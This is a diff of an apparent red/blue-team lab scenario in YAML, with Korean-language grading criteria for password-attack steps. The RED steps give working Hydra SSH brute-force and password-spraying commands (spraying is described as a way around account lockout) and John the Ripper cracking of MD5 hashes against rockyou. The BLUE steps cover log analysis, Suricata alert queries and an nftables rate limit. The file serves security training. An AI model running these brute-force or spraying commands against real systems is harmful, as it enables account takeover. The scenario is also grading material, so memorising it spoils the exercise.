@@ -36,20 +36,21 @@ steps:
     expect: 482c811da5d5b4bc6d497ffa98491e38
     field: stdout
     semantic:
-      intent: '[RED] 패스워드 공격 - 공격 기법 실행'
+      intent: '[RED] 3가지 해시 알고리즘 비교 — echo -n password123 | md5sum·sha1sum·sha256sum 동일 평문으로 MD5(32자)·SHA1(40자)·SHA256(64자)
+        16진 해시 생성. 같은 입력이어도 알고리즘별 완전히 다른 출력. 482c811da5d5b4bc6d497ffa98491e38 = password123 의 MD5'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - echo -n + md5sum/sha1sum/sha256sum 3개 해시 생성
+      - password123 의 MD5 = 482c811da5d5b4bc6d497ffa98491e38 검증 가능
+      - 알고리즘별 출력 길이 차이 인지
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - echo -n <pw> | <algo>sum
+      - openssl dgst -md5/-sha1/-sha256
+      - python3 -c import hashlib; ...
+      - sha256sum <file>
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - echo 에 -n 없음 (뉴라인 포함 → 다른 해시)
+      - 알고리즘 1개만 비교
+      - 해시 길이/형식 설명 없음
   target_vm: attacker
   script: echo -n 'password123' | md5sum && echo -n 'password123' | sha1sum && echo -n 'password123' |
     sha256sum
@@ -79,20 +80,21 @@ steps:
     expect: /tmp/dvwa_hashes.txt
     field: filesystem
     semantic:
-      intent: '[RED] 패스워드 공격 - 공격 기법 실행'
+      intent: '[RED] John the Ripper 입력 포맷 준비 — /tmp/dvwa_hashes.txt 에 user:hash 형식으로 4명 사용자(admin/gordonb/pablo/smithye)의
+        MD5 unsalted 해시 저장. DVWA 의 알려진 약한 해시. 5f4dcc3b5aa765d61d8327deb882cf99 = password 라는 유명 해시 포함'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - /tmp/dvwa_hashes.txt 파일 생성
+      - user:hash 형식의 줄 최소 3개
+      - MD5 해시 (32자 16진) 포함
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file << EOF heredoc
+      - echo user:hash >> file
+      - python으로 파일 작성
+      - awk 로 DB dump 파싱 후 포맷 변환
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - hash 만 (user 없음) — john 포맷 미스매치
+      - 평문 저장
+      - MD5 이외 알고리즘 사용
   target_vm: attacker
   script: 'cat > /tmp/dvwa_hashes.txt << ''EOF''
 
@@ -122,20 +124,22 @@ steps:
     expect: Loaded
     field: stdout
     semantic:
-      intent: '[RED] 패스워드 공격 - 공격 기법 실행'
+      intent: '[RED] John the Ripper MD5 사전 공격 — john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
+        /tmp/dvwa_hashes.txt. rockyou.txt 의 1,400만 개 유출 패스워드를 각각 MD5 해시해 대상 해시와 매칭. Loaded N password
+        hashes 로딩 확인 + 크래킹 진행'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - john --format=raw-md5 명령 실행
+      - --wordlist=rockyou.txt 또는 유사 대형 사전
+      - Loaded 또는 크래킹 진행 메시지
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - john --format=raw-md5 --wordlist=rockyou.txt file
+      - hashcat -m 0 (raw MD5) hash.txt rockyou.txt
+      - john --incremental 순차 브루트포스
+      - CeWL 로 맞춤 워드리스트 생성
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - --format 누락 (john 이 hash 타입 추측)
+      - wordlist 없이 incremental 만
+      - rockyou 이외 매우 작은 사전
   target_vm: attacker
   script: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/dvwa_hashes.txt
   risk_level: medium
@@ -154,20 +158,21 @@ steps:
     expect: password
     field: stdout
     semantic:
-      intent: '[RED] 패스워드 공격 - 공격 기법 실행'
+      intent: '[RED] john --show 크래킹 결과 조회 — john --show --format=raw-md5 /tmp/dvwa_hashes.txt 로 ~/.john/john.pot
+        에 저장된 복호화 결과 출력. admin:password, gordonb:abc123 등 약한 패스워드 공개. password 키워드 확인으로 성공 검증'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - john --show 명령 실행
+      - password 키워드 또는 평문 결과 출력
+      - user:cleartext 형식의 크래킹 결과
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - john --show --format=raw-md5 file
+      - cat ~/.john/john.pot 직접 조회
+      - hashcat --show -m 0 hash.txt
+      - john --show=left 미크래킹 해시 조회
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - --show 없이 크래킹 재실행
+      - 크래킹 결과 없음 (john 미실행)
+      - password 키워드 없음
   target_vm: attacker
   script: john --show --format=raw-md5 /tmp/dvwa_hashes.txt
   risk_level: medium
@@ -188,20 +193,22 @@ steps:
     expect: 'host:'
     field: stdout
     semantic:
-      intent: '[RED] 패스워드 공격 - 공격 기법 실행'
+      intent: '[RED] Hydra SSH 온라인 브루트포스 — hydra -l ccc -P unix_passwords.txt ssh://10.20.30.80 -t 4 -f
+        -w 5. 단일 사용자 ccc 대상 사전의 각 패스워드로 실제 SSH 로그인 시도. -t 4 (동시 4 연결, SSH 부하 고려), -f (첫 성공 시 중지), -w 5
+        (5초 대기). 오프라인 크래킹과 달리 네트워크·타이밍·계정 잠금 제약'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - hydra + ssh://<target> + -l user + -P wordlist
+      - -t 스레드 + -f 조기 종료 + -w 타임아웃
+      - 'host: 키워드 출력 (Hydra 성공 또는 완료 메시지)'
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - hydra -l user -P pw ssh://<target>
+      - medusa -u user -P pw -M ssh -h <target>
+      - ncrack -u user -P pw ssh://<target>
+      - msf auxiliary/scanner/ssh/ssh_login
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 오프라인 크래킹 (john) 재사용
+      - -t 너무 높음 (SSH 거부)
+      - 계정 잠금 위험 고려 없음
   target_vm: attacker
   script: hydra -l ccc -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.80 -t 4 -f
     -w 5
@@ -222,20 +229,22 @@ steps:
     expect: Failed
     field: stdout
     semantic:
-      intent: '[BLUE] 패스워드 공격 - 탐지·방어 구현'
+      intent: '[BLUE] /var/log/auth.log SSH 로그인 실패 확인 — grep Failed password 로 sshd PAM 인증 실패 이벤트 추출.
+        Hydra 브루트포스의 흔적은 짧은 시간 내 대량 Failed password from 10.20.30.201 port XXXX ssh2 반복. tail -20 로 최근
+        기록 확인'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - grep Failed password /var/log/auth.log 명령
+      - Failed 키워드 포함 출력
+      - 공격자 IP 또는 사용자 이름 반복 패턴 인지
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - grep Failed password auth.log
+      - journalctl -u sshd --since 1h | grep Failed
+      - lastb 로 bad login history
+      - ausearch -m USER_AUTH (auditd)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - auth.log 아닌 다른 로그 조회
+      - Failed 키워드 없이 grep (결과 과다)
+      - 시간 범위 없이 전체
   target_vm: web
   script: grep 'Failed password' /var/log/auth.log | tail -20
   risk_level: low
@@ -256,20 +265,22 @@ steps:
     expect: 10.20.30
     field: stdout
     semantic:
-      intent: '[BLUE] 패스워드 공격 - 탐지·방어 구현'
+      intent: '[BLUE] SSH 실패 공격 IP 집계 — grep Failed password auth.log | awk {print $(NF-3)} 로 IP 필드 추출
+        | sort | uniq -c | sort -rn | head -10. auth.log 포맷에서 from <IP> port <PORT> ssh2 중 <IP> 가 NF-3
+        번째 필드. 공격자 IP top 10 식별'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - grep Failed + awk 로 IP 필드 추출
+      - sort | uniq -c | sort -rn 집계 파이프라인
+      - 10.20.30 포함 IP 출력
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - grep + awk $(NF-3) + sort uniq -c
+      - fail2ban-client status sshd 로 차단 IP 조회
+      - pandas read_csv + value_counts
+      - ELK aggregation 질의
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - IP 추출 실패 (awk 필드 오류)
+      - 집계 없이 raw 출력
+      - 공격자 식별 없음
   target_vm: web
   script: grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
     | head -10
@@ -291,20 +302,22 @@ steps:
     expect: 10.20.30
     field: stdout
     semantic:
-      intent: '[BLUE] 패스워드 공격 - 탐지·방어 구현'
+      intent: '[BLUE] Suricata SSH 브루트포스 경보 조회 — jq select(.event_type==alert and (.alert.signature |
+        test(SSH|brute; i))) eve.json 으로 SSH 또는 brute 키워드 매칭 경보 필터. threshold 설정으로 연결 빈도 기반 탐지. fallback
+        으로 fast.log grep -i ssh'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - jq 로 alert + SSH/brute 패턴 필터 OR fast.log grep
+      - 10.20.30 또는 공격자 IP 출력
+      - threshold 기반 빈도 탐지 개념
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - jq select(.alert.signature | test(SSH; i)) eve.json
+      - suricata-update 로 ET Open SSH 룰 포함
+      - Elastic Security 룰 기반 SSH brute force
+      - Wazuh ruleset 5712 (SSH brute force)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - SSH 필터 없이 전체 경보
+      - eve.json JSON 파싱 아닌 grep 만
+      - 빈도 기반 탐지 개념 없음
   target_vm: secu
   script: tail -100 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert" and (.alert.signature
     | test("SSH|brute"; "i"))) | "\(.timestamp) \(.alert.signature)"' 2>/dev/null | tail -5 || grep -i
@@ -326,20 +339,22 @@ steps:
     expect: 10.20.30.201
     field: stdout
     semantic:
-      intent: '[BLUE] 패스워드 공격 - 탐지·방어 구현'
+      intent: '[BLUE] nftables SSH rate limit — nft add rule inet filter input ip saddr 10.20.30.201 tcp
+        dport 22 ct state new limit rate over 3/minute drop. SSH(22) 의 새 연결(ct state new)만 제한하므로 기존 세션은
+        유지. 분당 3회 초과 시 drop. w2 의 웹 rate limit 보다 낮은 임계치(SSH 는 정상 빈도가 낮음)'
       success_criteria:
-      - 방어 룰·설정 작성 (Suricata/Wazuh/nftables 등)
-      - 탐지 동작 확인
-      - false positive 고려
+      - nft add rule 또는 nftables 명령
+      - tcp dport 22 + rate 설정
+      - 공격자 IP 10.20.30.201 지정
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - nft add rule inet filter input ... tcp dport 22 limit rate over 3/minute drop
+      - iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min
+      - fail2ban jail sshd 로 자동화
+      - sshd_config MaxAuthTries=3 + ClientAliveInterval
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - 포트 22 아닌 다른 포트 rate limit
+      - ct state 조건 없음 (기존 세션 차단)
+      - nft list ruleset 확인 누락
   target_vm: secu
   requires_approval: true
   script: sudo nft add rule inet filter input ip saddr 10.20.30.201 tcp dport 22 ct state new limit rate
@@ -361,20 +376,22 @@ steps:
     expect: 'host:'
     field: stdout
     semantic:
-      intent: '[RED] 패스워드 공격 - 공격 기법 실행'
+      intent: '[RED] 패스워드 스프레이 시뮬레이션 — echo -e root\nccc\nadmin\nwww-data\nservice > /tmp/users.txt +
+        hydra -L users.txt -p ccc ssh://<target>. 브루트포스(한 계정 여러 PW)와 반대로 여러 계정 한 패스워드. 계정 잠금 정책 우회 전략.
+        MITRE T1110.003 Password Spraying'
       success_criteria:
-      - 공격 도구·명령 실제 실행
-      - 결과 확인 (응답·로그)
-      - 기법의 ATT&CK ID 또는 도구명 언급
+      - hydra -L <userlist> -p <single_password> 실행 (대문자 -L 로 사용자 리스트)
+      - userlist 파일 생성 (root/ccc/admin 등 공통 계정)
+      - 'host: 또는 Hydra 완료 메시지'
       acceptable_methods:
-      - 공격 도구(nmap/sqlmap/hydra/msf) 직접 실행
-      - 방어 룰(Suricata/Wazuh/fail2ban/nftables) 편집
-      - Python 스크립트로 자동화
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - hydra -L users -p <pw> ssh://<target>
+      - spray.sh 또는 Kerberoast spraying
+      - crackmapexec smb <range> -u users -p <pw>
+      - python paramiko 로 스프레이 스크립트
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 응답
+      - -P (여러 PW) 사용 — 스프레이 아닌 브루트포스
+      - 단일 사용자만 (스프레이 아님)
+      - 계정 잠금 우회 개념 없음
   target_vm: attacker
   script: echo -e 'root\nccc\nadmin\nwww-data\nservice' > /tmp/users.txt && hydra -L /tmp/users.txt -p
     ccc ssh://10.20.30.80 -t 4 -f -w 5
